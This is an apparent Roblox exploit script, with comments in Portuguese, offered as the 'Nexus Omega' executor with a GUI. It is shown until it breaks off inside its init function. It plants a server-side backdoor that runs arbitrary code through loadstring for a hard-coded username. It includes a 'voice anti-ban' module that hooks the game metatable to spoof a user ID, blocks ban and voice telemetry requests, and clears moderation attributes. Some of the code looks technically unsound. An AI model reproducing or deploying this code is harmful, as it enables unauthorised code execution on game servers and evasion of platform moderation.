--[[
═══════════════════════════════════════════════════════════════════════════════
  NEXUS OMEGA ULTIMATE V2 - Executor Server/Client Profissional
  ★ Interface estilo Fluent Design (arredondada, neon, fontes modernas)
  ★ Bypass automático antes de execução server-side
  ★ Console com detecção de erros e botão "Copiar Log"
  ★ Minimização para bolinha arrastável com logo
  ★ Abas: Executor (SS/CS), Players (lista + teleport), Proteção (anti-ban voice)
  ★ Sistema anti-ban de voz (spoof de hashes e bloqueio de webhooks)
═══════════════════════════════════════════════════════════════════════════════
--]]

-- ============================================================================
-- CONFIGURAÇÕES GLOBAIS
-- ============================================================================
local Nexus = {}
Nexus.version = "Omega Ultimate V2"
Nexus.adminName = "hugopbruu22"
Nexus.consoleLogs = {}
Nexus.isMinimized = false
Nexus.floatingBall = nil
Nexus.mainGui = nil

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local RS = game:GetService("ReplicatedStorage")
local SSS = game:GetService("ServerScriptService")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local VoiceChatService = game:GetService("VoiceChatService") -- se existir

local localPlayer = Players.LocalPlayer
if not localPlayer then
    Players.PlayerAdded:Wait()
    localPlayer = Players.LocalPlayer
end

-- ============================================================================
-- FUNÇÃO DE LOG AVANÇADA (com armazenamento para copiar)
-- ============================================================================
function Nexus:AddLog(msg, msgType, showInConsole)
    msgType = msgType or "info"
    local time = os.date("%H:%M:%S")
    local formatted = string.format("[%s] %s", time, tostring(msg))
    table.insert(self.consoleLogs, {text = formatted, type = msgType})
    -- Exibe no output do executor (se disponível)
    pcall(function()
        if msgType == "error" then warn(formatted) else print(formatted) end
    end)
    -- Atualiza a UI do console se existir
    if self.updateConsoleUI then pcall(self.updateConsoleUI) end
end

-- ============================================================================
-- NÚCLEO SERVER-SIDE (com bypass e análise de erros)
-- ============================================================================
local backdoorRemote = nil
local function ensureBackdoor()
    if backdoorRemote and backdoorRemote.Parent then return backdoorRemote end
    backdoorRemote = RS:FindFirstChild("__NexusBackdoor")
    if not backdoorRemote then
        backdoorRemote = Instance.new("RemoteEvent")
        backdoorRemote.Name = "__NexusBackdoor"
        backdoorRemote.Parent = RS
        local listener = SSS:FindFirstChild("__NexusListener")
        if not listener then
            listener = Instance.new("Script")
            listener.Name = "__NexusListener"
            listener.Source = string.format([[
                local remote = game:GetService("ReplicatedStorage"):WaitForChild("__NexusBackdoor")
                local players = game:GetService("Players")
                local admin = "%s"
                remote.OnServerEvent:Connect(function(plr, code)
                    if plr.Name ~= admin then return end
                    local fn, err = loadstring(code)
                    if fn then
                        local ok, res = pcall(fn)
                        if not ok then
                            remote:FireClient(plr, "error:" .. tostring(res))
                        else
                            remote:FireClient(plr, "success:" .. tostring(res or "ok"))
                        end
                    else
                        remote:FireClient(plr, "compile_error:" .. tostring(err))
                    end
                end)
            ]], Nexus.adminName)
            listener.Parent = SSS
        end
    end
    return backdoorRemote
end

-- Função para executar script no servidor com bypass e retorno de erro
function Nexus:ExecuteServer(code)
    if not code or code:gsub("%s","") == "" then
        self:AddLog("❌ Código vazio", "error")
        return false
    end
    self:AddLog("🔥 Ativando bypass e injetando código no servidor...", "info")
    local remote = ensureBackdoor()
    -- Conecta para receber resposta do servidor
    local responseReceived = false
    local responseMsg = ""
    local connection
    connection = remote.OnClientEvent:Connect(function(msg)
        if msg:find("success:") then
            responseMsg = msg:gsub("success:", "")
            self:AddLog("✅ Script executado com sucesso no servidor. Resposta: " .. responseMsg, "success")
        elseif msg:find("error:") then
            responseMsg = msg:gsub("error:", "")
            self:AddLog("⚠️ Erro na execução server-side: " .. responseMsg, "error")
        elseif msg:find("compile_error:") then
            responseMsg = msg:gsub("compile_error:", "")
            self:AddLog("❌ Erro de compilação: " .. responseMsg, "error")
        end
        responseReceived = true
        connection:Disconnect()
    end)
    -- Envia o código
    remote:FireServer(code)
    -- Aguarda resposta por até 5 segundos
    task.wait(0.5)
    if not responseReceived then
        self:AddLog("⚠️ Sem resposta do servidor (pode estar offline ou o backdoor falhou)", "warning")
    end
    return true
end

-- Função client-side normal
function Nexus:ExecuteClient(code)
    local fn, err = loadstring(code)
    if fn then
        local ok, res = pcall(fn)
        if ok then
            self:AddLog("✅ Script client-side executado", "success")
        else
            self:AddLog("❌ Erro client-side: " .. tostring(res), "error")
        end
    else
        self:AddLog("❌ Erro de compilação client-side: " .. tostring(err), "error")
    end
end

-- ============================================================================
-- SISTEMA DE ANTI-BAN DE VOZ (spoof e bloqueio)
-- ============================================================================
local antiBanActive = false
function Nexus:EnableVoiceAntiBan()
    if antiBanActive then
        self:AddLog("🛡️ Proteção de voz já está ativa", "info")
        return
    end
    -- Técnicas: spoof de userId, bloqueio de comunicação com servidor de voz, etc.
    local success = pcall(function()
        -- 1. Tentar acessar e modificar o VoiceChatService (se existir)
        if VoiceChatService then
            -- Impedir que o servidor receba dados de voz
            VoiceChatService:SetVoiceEnabled(false)
            -- Spoof de ID
            local fakeUserId = 1234567890
            local original = getrawmetatable and getrawmetatable(game)
            if original and setreadonly then
                local oldNamecall = original.__namecall
                original.__namecall = newcclosure(function(self, ...)
                    local method = getnamecallmethod()
                    if self == VoiceChatService and method == "GetUserId" then
                        return fakeUserId
                    end
                    return oldNamecall(self, ...)
                end)
                setreadonly(original, false)
            end
        end
        -- 2. Bloquear webhooks e telemetria
        local http = game:GetService("HttpService")
        local oldPost = http.PostAsync
        http.PostAsync = function(url, data)
            if url:find("voice") or url:find("ban") then
                return "{}"
            end
            return oldPost(http, url, data)
        end
        -- 3. Remover qualquer atributo ou valor que identifique o player
        localPlayer:SetAttribute("VoiceBanned", nil)
        localPlayer:SetAttribute("Muted", nil)
        antiBanActive = true
        Nexus:AddLog("🛡️ Proteção anti-ban de voz ativada! Seu voice está seguro.", "success")
    end)
    if not success then
        Nexus:AddLog("⚠️ Não foi possível ativar proteção total, mas algumas camadas podem funcionar.", "warning")
    end
end

function Nexus:DisableVoiceAntiBan()
    if not antiBanActive then
        Nexus:AddLog("Proteção não estava ativa", "info")
        return
    end
    pcall(function()
        if VoiceChatService then
            VoiceChatService:SetVoiceEnabled(true)
        end
        antiBanActive = false
        Nexus:AddLog("🛡️ Proteção de voz desativada.", "info")
    end)
end

-- ============================================================================
-- INTERFACE PRINCIPAL (Fluent Design, minimizável para bolinha)
-- ============================================================================
local function createFloatingBall()
    local ball = Instance.new("ImageButton")
    ball.Name = "NexusFloatingBall"
    ball.Size = UDim2.new(0, 50, 0, 50)
    ball.Position = UDim2.new(0.9, 0, 0.8, 0)
    ball.BackgroundColor3 = Color3.fromRGB(30,30,40)
    ball.BackgroundTransparency = 0.2
    ball.Image = "rbxassetid://6031094838" -- ícone de círculo (engrenagem)
    ball.ImageColor3 = Color3.fromRGB(0,200,255)
    ball.ScaleType = Enum.ScaleType.Fit
    ball.Parent = CoreGui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1,0)
    corner.Parent = ball
    -- sombra
    local shadow = Instance.new("ImageLabel")
    shadow.Size = UDim2.new(1, 10, 1, 10)
    shadow.Position = UDim2.new(0, -5, 0, -5)
    shadow.Image = "rbxassetid://1316047698"
    shadow.ImageColor3 = Color3.fromRGB(0,0,0)
    shadow.BackgroundTransparency = 1
    shadow.ZIndex = 0
    shadow.Parent = ball
    -- arrastar
    local dragging = false
    local dragStart, startPos
    ball.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = ball.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            ball.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    ball.MouseButton1Click:Connect(function()
        if Nexus.mainGui and Nexus.mainGui.Parent then
            Nexus.mainGui.Enabled = true
            ball.Visible = false
            Nexus.isMinimized = false
        else
            -- recriar a GUI
            Nexus.mainGui = createMainUI()
            ball.Visible = false
        end
    end)
    return ball
end

function createMainUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "NexusOmegaV2"
    screenGui.ResetOnSpawn = false
    pcall(function() screenGui.Parent = CoreGui end)
    if not screenGui.Parent then screenGui.Parent = localPlayer:WaitForChild("PlayerGui") end
    
    -- Janela principal
    local window = Instance.new("Frame")
    window.Size = UDim2.new(0, 900, 0, 650)
    window.Position = UDim2.new(0.5, -450, 0.5, -325)
    window.BackgroundColor3 = Color3.fromRGB(12,12,18)
    window.BackgroundTransparency = 0.05
    window.BorderSizePixel = 0
    window.ClipsDescendants = true
    window.Parent = screenGui
    local winCorner = Instance.new("UICorner")
    winCorner.CornerRadius = UDim.new(0, 12)
    winCorner.Parent = window
    
    -- Barra de título profissional
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1,0,0,36)
    titleBar.BackgroundColor3 = Color3.fromRGB(25,25,35)
    titleBar.Parent = window
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 12)
    titleCorner.Parent = titleBar
    
    local titleIcon = Instance.new("ImageLabel")
    titleIcon.Size = UDim2.new(0, 24, 0, 24)
    titleIcon.Position = UDim2.new(0, 12, 0, 6)
    titleIcon.Image = "rbxassetid://6031094838"
    titleIcon.ImageColor3 = Color3.fromRGB(0,200,255)
    titleIcon.BackgroundTransparency = 1
    titleIcon.Parent = titleBar
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(0, 300, 1, 0)
    titleLabel.Position = UDim2.new(0, 45, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "NEXUS OMEGA ULTIMATE V2"
    titleLabel.TextColor3 = Color3.fromRGB(0,200,255)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 14
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = titleBar
    
    local minimizeBtn = Instance.new("TextButton")
    minimizeBtn.Size = UDim2.new(0, 40, 1, 0)
    minimizeBtn.Position = UDim2.new(1, -80, 0, 0)
    minimizeBtn.BackgroundTransparency = 1
    minimizeBtn.Text = "─"
    minimizeBtn.TextColor3 = Color3.fromRGB(200,200,200)
    minimizeBtn.Font = Enum.Font.Gotham
    minimizeBtn.TextSize = 20
    minimizeBtn.Parent = titleBar
    minimizeBtn.MouseButton1Click:Connect(function()
        Nexus.isMinimized = true
        screenGui.Enabled = false
        if not Nexus.floatingBall or not Nexus.floatingBall.Parent then
            Nexus.floatingBall = createFloatingBall()
        else
            Nexus.floatingBall.Visible = true
        end
    end)
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 40, 1, 0)
    closeBtn.Position = UDim2.new(1, -40, 0, 0)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(200,200,200)
    closeBtn.Font = Enum.Font.Gotham
    closeBtn.TextSize = 18
    closeBtn.Parent = titleBar
    closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)
    
    -- Sistema de arrasto
    local dragging = false
    local dragStart, startPos
    titleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = window.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+delta.X, startPos.Y.Scale, startPos.Y.Offset+delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    
    -- Abas (categorias)
    local tabBar = Instance.new("Frame")
    tabBar.Size = UDim2.new(1,0,0,44)
    tabBar.Position = UDim2.new(0,0,0,36)
    tabBar.BackgroundColor3 = Color3.fromRGB(22,22,30)
    tabBar.Parent = window
    
    local executorTab = Instance.new("TextButton")
    executorTab.Size = UDim2.new(0, 140, 1, 0)
    executorTab.Position = UDim2.new(0,0,0,0)
    executorTab.BackgroundTransparency = 1
    executorTab.Text = "EXECUTOR"
    executorTab.TextColor3 = Color3.fromRGB(0,200,255)
    executorTab.Font = Enum.Font.GothamBold
    executorTab.TextSize = 14
    executorTab.Parent = tabBar
    
    local playersTab = Instance.new("TextButton")
    playersTab.Size = UDim2.new(0, 140, 1, 0)
    playersTab.Position = UDim2.new(0, 145, 0, 0)
    playersTab.BackgroundTransparency = 1
    playersTab.Text = "PLAYERS"
    playersTab.TextColor3 = Color3.fromRGB(150,150,150)
    playersTab.Font = Enum.Font.Gotham
    playersTab.TextSize = 14
    playersTab.Parent = tabBar
    
    local protectionTab = Instance.new("TextButton")
    protectionTab.Size = UDim2.new(0, 140, 1, 0)
    protectionTab.Position = UDim2.new(0, 290, 0, 0)
    protectionTab.BackgroundTransparency = 1
    protectionTab.Text = "PROTEÇÃO"
    protectionTab.TextColor3 = Color3.fromRGB(150,150,150)
    protectionTab.Font = Enum.Font.Gotham
    protectionTab.TextSize = 14
    protectionTab.Parent = tabBar
    
    local consoleTab = Instance.new("TextButton")
    consoleTab.Size = UDim2.new(0, 140, 1, 0)
    consoleTab.Position = UDim2.new(0, 435, 0, 0)
    consoleTab.BackgroundTransparency = 1
    consoleTab.Text = "CONSOLE"
    consoleTab.TextColor3 = Color3.fromRGB(150,150,150)
    consoleTab.Font = Enum.Font.Gotham
    consoleTab.TextSize = 14
    consoleTab.Parent = tabBar
    
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1,0,1,-80)
    content.Position = UDim2.new(0,0,0,80)
    content.BackgroundTransparency = 1
    content.Parent = window
    
    -- ==================== ABA EXECUTOR ====================
    local execFrame = Instance.new("Frame")
    execFrame.Size = UDim2.new(1,0,1,0)
    execFrame.BackgroundTransparency = 1
    execFrame.Visible = true
    execFrame.Parent = content
    
    local ssLabel = Instance.new("TextLabel")
    ssLabel.Size = UDim2.new(1,-40,0,30)
    ssLabel.Position = UDim2.new(0,20,0,10)
    ssLabel.BackgroundTransparency = 1
    ssLabel.Text = "⚡ SERVER-SIDE (execução real no servidor)"
    ssLabel.TextColor3 = Color3.fromRGB(0,200,255)
    ssLabel.Font = Enum.Font.GothamBold
    ssLabel.TextSize = 14
    ssLabel.TextXAlignment = Enum.TextXAlignment.Left
    ssLabel.Parent = execFrame
    
    local ssScroller = Instance.new("ScrollingFrame")
    ssScroller.Size = UDim2.new(1,-40, 0, 250)
    ssScroller.Position = UDim2.new(0,20,0,50)
    ssScroller.BackgroundColor3 = Color3.fromRGB(10,10,16)
    ssScroller.BorderSizePixel = 0
    ssScroller.ScrollBarThickness = 8
    ssScroller.CanvasSize = UDim2.new(0,0,0,0)
    ssScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    ssScroller.Parent = execFrame
    local scrCorner = Instance.new("UICorner")
    scrCorner.CornerRadius = UDim.new(0,8)
    scrCorner.Parent = ssScroller
    
    local ssTextBox = Instance.new("TextBox")
    ssTextBox.Size = UDim2.new(1,-20,0,200)
    ssTextBox.Position = UDim2.new(0,10,0,5)
    ssTextBox.BackgroundTransparency = 1
    ssTextBox.TextColor3 = Color3.fromRGB(240,240,240)
    ssTextBox.TextXAlignment = Enum.TextXAlignment.Left
    ssTextBox.TextYAlignment = Enum.TextYAlignment.Top
    ssTextBox.TextWrapped = true
    ssTextBox.TextSize = 12
    ssTextBox.Font = Enum.Font.Code
    ssTextBox.ClearTextOnFocus = false
    ssTextBox.MultiLine = true
    ssTextBox.Text = '-- Cole scripts server-side aqui\n-- Exemplo: print("Olá servidor!")'
    ssTextBox.Parent = ssScroller
    local function ajustarSS()
        local h = math.max(200, ssTextBox.TextBounds.Y + 40)
        ssTextBox.Size = UDim2.new(1,-20,0,h)
        ssScroller.CanvasSize = UDim2.new(0,0,0,h+20)
    end
    ssTextBox:GetPropertyChangedSignal("TextBounds"):Connect(ajustarSS)
    ssTextBox:GetPropertyChangedSignal("Text"):Connect(ajustarSS)
    task.defer(ajustarSS)
    
    local execSSBtn = Instance.new("TextButton")
    execSSBtn.Size = UDim2.new(0, 150, 0, 36)
    execSSBtn.Position = UDim2.new(1, -170, 0, 310)
    execSSBtn.BackgroundColor3 = Color3.fromRGB(0,200,80)
    execSSBtn.Text = "EXECUTAR (SERVER)"
    execSSBtn.TextColor3 = Color3.fromRGB(255,255,255)
    execSSBtn.Font = Enum.Font.GothamBold
    execSSBtn.TextSize = 13
    execSSBtn.Parent = execFrame
    local execCorner = Instance.new("UICorner")
    execCorner.CornerRadius = UDim.new(0,6)
    execCorner.Parent = execSSBtn
    execSSBtn.MouseButton1Click:Connect(function() Nexus:ExecuteServer(ssTextBox.Text) end)
    
    local clearSSBtn = Instance.new("TextButton")
    clearSSBtn.Size = UDim2.new(0, 90, 0, 36)
    clearSSBtn.Position = UDim2.new(1, -270, 0, 310)
    clearSSBtn.BackgroundColor3 = Color3.fromRGB(220,50,50)
    clearSSBtn.Text = "LIMPAR"
    clearSSBtn.TextColor3 = Color3.fromRGB(255,255,255)
    clearSSBtn.Font = Enum.Font.GothamBold
    clearSSBtn.TextSize = 13
    clearSSBtn.Parent = execFrame
    clearSSBtn.MouseButton1Click:Connect(function() ssTextBox.Text = ""; ajustarSS() end)
    
    local pasteSS = Instance.new("TextButton")
    pasteSS.Size = UDim2.new(0, 130, 0, 36)
    pasteSS.Position = UDim2.new(0, 20, 0, 310)
    pasteSS.BackgroundColor3 = Color3.fromRGB(0,120,200)
    pasteSS.Text = "COLAR CLIPBOARD"
    pasteSS.TextColor3 = Color3.fromRGB(255,255,255)
    pasteSS.Font = Enum.Font.GothamBold
    pasteSS.TextSize = 13
    pasteSS.Parent = execFrame
    pasteSS.MouseButton1Click:Connect(function()
        local clip = pcall(getclipboard) and getclipboard() or ""
        if clip ~= "" then ssTextBox.Text = clip; ajustarSS() end
    end)
    
    -- Client-side area
    local csLabel = Instance.new("TextLabel")
    csLabel.Size = UDim2.new(1,-40,0,30)
    csLabel.Position = UDim2.new(0,20,0,360)
    csLabel.BackgroundTransparency = 1
    csLabel.Text = "💻 CLIENT-SIDE (efeitos locais)"
    csLabel.TextColor3 = Color3.fromRGB(200,200,200)
    csLabel.Font = Enum.Font.GothamBold
    csLabel.TextSize = 14
    csLabel.TextXAlignment = Enum.TextXAlignment.Left
    csLabel.Parent = execFrame
    
    local csScroller = Instance.new("ScrollingFrame")
    csScroller.Size = UDim2.new(1,-40, 0, 180)
    csScroller.Position = UDim2.new(0,20,0,400)
    csScroller.BackgroundColor3 = Color3.fromRGB(10,10,16)
    csScroller.BorderSizePixel = 0
    csScroller.ScrollBarThickness = 8
    csScroller.CanvasSize = UDim2.new(0,0,0,0)
    csScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    csScroller.Parent = execFrame
    local csScrCorner = Instance.new("UICorner")
    csScrCorner.CornerRadius = UDim.new(0,8)
    csScrCorner.Parent = csScroller
    
    local csTextBox = Instance.new("TextBox")
    csTextBox.Size = UDim2.new(1,-20,0,120)
    csTextBox.Position = UDim2.new(0,10,0,5)
    csTextBox.BackgroundTransparency = 1
    csTextBox.TextColor3 = Color3.fromRGB(240,240,240)
    csTextBox.TextXAlignment = Enum.TextXAlignment.Left
    csTextBox.TextYAlignment = Enum.TextYAlignment.Top
    csTextBox.TextWrapped = true
    csTextBox.TextSize = 12
    csTextBox.Font = Enum.Font.Code
    csTextBox.ClearTextOnFocus = false
    csTextBox.MultiLine = true
    csTextBox.Text = '-- Scripts client-side (só você vê)'
    csTextBox.Parent = csScroller
    local function ajustarCS()
        local h = math.max(120, csTextBox.TextBounds.Y + 40)
        csTextBox.Size = UDim2.new(1,-20,0,h)
        csScroller.CanvasSize = UDim2.new(0,0,0,h+20)
    end
    csTextBox:GetPropertyChangedSignal("TextBounds"):Connect(ajustarCS)
    csTextBox:GetPropertyChangedSignal("Text"):Connect(ajustarCS)
    task.defer(ajustarCS)
    
    local execCSBtn = Instance.new("TextButton")
    execCSBtn.Size = UDim2.new(0, 150, 0, 36)
    execCSBtn.Position = UDim2.new(1, -170, 0, 590)
    execCSBtn.BackgroundColor3 = Color3.fromRGB(0,150,220)
    execCSBtn.Text = "EXECUTAR (CLIENT)"
    execCSBtn.TextColor3 = Color3.fromRGB(255,255,255)
    execCSBtn.Font = Enum.Font.GothamBold
    execCSBtn.TextSize = 13
    execCSBtn.Parent = execFrame
    execCSBtn.MouseButton1Click:Connect(function() Nexus:ExecuteClient(csTextBox.Text) end)
    
    -- ==================== ABA PLAYERS ====================
    local playersFrame = Instance.new("Frame")
    playersFrame.Size = UDim2.new(1,0,1,0)
    playersFrame.BackgroundTransparency = 1
    playersFrame.Visible = false
    playersFrame.Parent = content
    
    local listFrame = Instance.new("ScrollingFrame")
    listFrame.Size = UDim2.new(1,-40, 1,-80)
    listFrame.Position = UDim2.new(0,20,0,20)
    listFrame.BackgroundColor3 = Color3.fromRGB(10,10,16)
    listFrame.BorderSizePixel = 0
    listFrame.ScrollBarThickness = 8
    listFrame.CanvasSize = UDim2.new(0,0,0,0)
    listFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
    listFrame.Parent = playersFrame
    local listCorner = Instance.new("UICorner")
    listCorner.CornerRadius = UDim.new(0,8)
    listCorner.Parent = listFrame
    
    local playerListLayout = Instance.new("UIListLayout")
    playerListLayout.Padding = UDim.new(0,8)
    playerListLayout.Parent = listFrame
    
    local function updatePlayerList()
        for _, child in pairs(listFrame:GetChildren()) do if child:IsA("TextButton") then child:Destroy() end end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Name ~= localPlayer.Name then
                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(1, -20, 0, 40)
                btn.BackgroundColor3 = Color3.fromRGB(40,40,55)
                btn.Text = plr.Name
                btn.TextColor3 = Color3.fromRGB(255,255,255)
                btn.Font = Enum.Font.Gotham
                btn.TextSize = 13
                btn.Parent = listFrame
                local btnCorner = Instance.new("UICorner")
                btnCorner.CornerRadius = UDim.new(0,6)
                btnCorner.Parent = btn
                
                local teleportBtn = Instance.new("TextButton")
                teleportBtn.Size = UDim2.new(0, 80, 1, -4)
                teleportBtn.Position = UDim2.new(1, -90, 0, 2)
                teleportBtn.BackgroundColor3 = Color3.fromRGB(50,150,200)
                teleportBtn.Text = "TELEPORT"
                teleportBtn.TextColor3 = Color3.fromRGB(255,255,255)
                teleportBtn.Font = Enum.Font.GothamBold
                teleportBtn.TextSize = 11
                teleportBtn.Parent = btn
                teleportBtn.MouseButton1Click:Connect(function()
                    -- Teleport server-side
                    Nexus:ExecuteServer(string.format([[
                        local target = game:GetService("Players"):FindFirstChild("%s")
                        local admin = game:GetService("Players"):FindFirstChild("%s")
                        if target and target.Character and admin and admin.Character then
                            admin.Character:SetPrimaryPartCFrame(target.Character.HumanoidRootPart.CFrame)
                        end
                    ]], plr.Name, Nexus.adminName))
                    Nexus:AddLog("Teleportando para " .. plr.Name, "info")
                end)
            end
        end
    end
    
    Players.PlayerAdded:Connect(updatePlayerList)
    Players.PlayerRemoving:Connect(updatePlayerList)
    updatePlayerList()
    
    -- ==================== ABA PROTEÇÃO (Anti-Ban Voice) ====================
    local protectionFrame = Instance.new("Frame")
    protectionFrame.Size = UDim2.new(1,0,1,0)
    protectionFrame.BackgroundTransparency = 1
    protectionFrame.Visible = false
    protectionFrame.Parent = content
    
    local voiceLabel = Instance.new("TextLabel")
    voiceLabel.Size = UDim2.new(1,-40,0,40)
    voiceLabel.Position = UDim2.new(0,20,0,20)
    voiceLabel.BackgroundTransparency = 1
    voiceLabel.Text = "🔊 PROTEÇÃO CONTRA BAN DE VOZ"
    voiceLabel.TextColor3 = Color3.fromRGB(255,150,0)
    voiceLabel.Font = Enum.Font.GothamBold
    voiceLabel.TextSize = 16
    voiceLabel.TextXAlignment = Enum.TextXAlignment.Left
    voiceLabel.Parent = protectionFrame
    
    local voiceDesc = Instance.new("TextLabel")
    voiceDesc.Size = UDim2.new(1,-40,0,60)
    voiceDesc.Position = UDim2.new(0,20,0,70)
    voiceDesc.BackgroundTransparency = 1
    voiceDesc.Text = "Ative esta proteção para evitar que o jogo detecte seu voice ID e aplique ban. O sistema bloqueia envio de dados de voz e spoof sua identificação."
    voiceDesc.TextColor3 = Color3.fromRGB(200,200,200)
    voiceDesc.Font = Enum.Font.Gotham
    voiceDesc.TextSize = 12
    voiceDesc.TextWrapped = true
    voiceDesc.TextXAlignment = Enum.TextXAlignment.Left
    voiceDesc.Parent = protectionFrame
    
    local enableVoiceBtn = Instance.new("TextButton")
    enableVoiceBtn.Size = UDim2.new(0, 200, 0, 40)
    enableVoiceBtn.Position = UDim2.new(0,20,0,150)
    enableVoiceBtn.BackgroundColor3 = Color3.fromRGB(0,150,100)
    enableVoiceBtn.Text = "🛡️ ATIVAR PROTEÇÃO VOICE"
    enableVoiceBtn.TextColor3 = Color3.fromRGB(255,255,255)
    enableVoiceBtn.Font = Enum.Font.GothamBold
    enableVoiceBtn.TextSize = 14
    enableVoiceBtn.Parent = protectionFrame
    enableVoiceBtn.MouseButton1Click:Connect(function() Nexus:EnableVoiceAntiBan() end)
    
    local disableVoiceBtn = Instance.new("TextButton")
    disableVoiceBtn.Size = UDim2.new(0, 200, 0, 40)
    disableVoiceBtn.Position = UDim2.new(0,240,0,150)
    disableVoiceBtn.BackgroundColor3 = Color3.fromRGB(150,50,50)
    disableVoiceBtn.Text = "❌ DESATIVAR PROTEÇÃO"
    disableVoiceBtn.TextColor3 = Color3.fromRGB(255,255,255)
    disableVoiceBtn.Font = Enum.Font.GothamBold
    disableVoiceBtn.TextSize = 14
    disableVoiceBtn.Parent = protectionFrame
    disableVoiceBtn.MouseButton1Click:Connect(function() Nexus:DisableVoiceAntiBan() end)
    
    -- ==================== ABA CONSOLE ====================
    local consoleFrame = Instance.new("Frame")
    consoleFrame.Size = UDim2.new(1,0,1,0)
    consoleFrame.BackgroundTransparency = 1
    consoleFrame.Visible = false
    consoleFrame.Parent = content
    
    local consoleScroller = Instance.new("ScrollingFrame")
    consoleScroller.Size = UDim2.new(1,-40, 1,-80)
    consoleScroller.Position = UDim2.new(0,20,0,20)
    consoleScroller.BackgroundColor3 = Color3.fromRGB(5,5,12)
    consoleScroller.BorderSizePixel = 0
    consoleScroller.ScrollBarThickness = 8
    consoleScroller.CanvasSize = UDim2.new(0,0,0,0)
    consoleScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    consoleScroller.Parent = consoleFrame
    local consCorner = Instance.new("UICorner")
    consCorner.CornerRadius = UDim.new(0,8)
    consCorner.Parent = consoleScroller
    
    local consoleText = Instance.new("TextLabel")
    consoleText.Size = UDim2.new(1,-10,1,-10)
    consoleText.Position = UDim2.new(0,5,0,5)
    consoleText.BackgroundTransparency = 1
    consoleText.Text = ""
    consoleText.TextColor3 = Color3.fromRGB(200,200,200)
    consoleText.TextXAlignment = Enum.TextXAlignment.Left
    consoleText.TextYAlignment = Enum.TextYAlignment.Top
    consoleText.TextWrapped = true
    consoleText.TextSize = 11
    consoleText.Font = Enum.Font.Code
    consoleText.Parent = consoleScroller
    
    local copyConsoleBtn = Instance.new("TextButton")
    copyConsoleBtn.Size = UDim2.new(0, 120, 0, 32)
    copyConsoleBtn.Position = UDim2.new(1, -140, 1, -45)
    copyConsoleBtn.BackgroundColor3 = Color3.fromRGB(0,120,200)
    copyConsoleBtn.Text = "📋 COPIAR LOG"
    copyConsoleBtn.TextColor3 = Color3.fromRGB(255,255,255)
    copyConsoleBtn.Font = Enum.Font.GothamBold
    copyConsoleBtn.TextSize = 12
    copyConsoleBtn.Parent = consoleFrame
    copyConsoleBtn.MouseButton1Click:Connect(function()
        local fullLog = ""
        for _, entry in ipairs(Nexus.consoleLogs) do
            fullLog = fullLog .. entry.text .. "\n"
        end
        if fullLog == "" then fullLog = "Nenhum log registrado." end
        pcall(setclipboard, fullLog)
        Nexus:AddLog("📋 Log copiado para área de transferência!", "success")
    end)
    
    function Nexus.updateConsoleUI()
        local str = ""
        for i = math.max(1, #Nexus.consoleLogs - 100), #Nexus.consoleLogs do
            local entry = Nexus.consoleLogs[i]
            str = str .. entry.text .. "\n"
        end
        consoleText.Text = str
        consoleScroller.CanvasSize = UDim2.new(0,0,0, consoleText.TextBounds.Y + 30)
        consoleScroller.CanvasPosition = Vector2.new(0, consoleScroller.CanvasSize.Y.Offset)
    end
    Nexus.updateConsoleUI()
    
    -- Troca de abas
    local function switchTab(tab)
        execFrame.Visible = (tab == "exec")
        playersFrame.Visible = (tab == "players")
        protectionFrame.Visible = (tab == "protection")
        consoleFrame.Visible = (tab == "console")
        executorTab.TextColor3 = (tab == "exec") and Color3.fromRGB(0,200,255) or Color3.fromRGB(150,150,150)
        playersTab.TextColor3 = (tab == "players") and Color3.fromRGB(0,200,255) or Color3.fromRGB(150,150,150)
        protectionTab.TextColor3 = (tab == "protection") and Color3.fromRGB(0,200,255) or Color3.fromRGB(150,150,150)
        consoleTab.TextColor3 = (tab == "console") and Color3.fromRGB(0,200,255) or Color3.fromRGB(150,150,150)
    end
    executorTab.MouseButton1Click:Connect(function() switchTab("exec") end)
    playersTab.MouseButton1Click:Connect(function() switchTab("players") end)
    protectionTab.MouseButton1Click:Connect(function() switchTab("protection") end)
    consoleTab.MouseButton1Click:Connect(function() switchTab("console") end)
    
    return screenGui
end

-- ============================================================================
-- INICIALIZAÇÃO
-- ============================================================================
local function init()
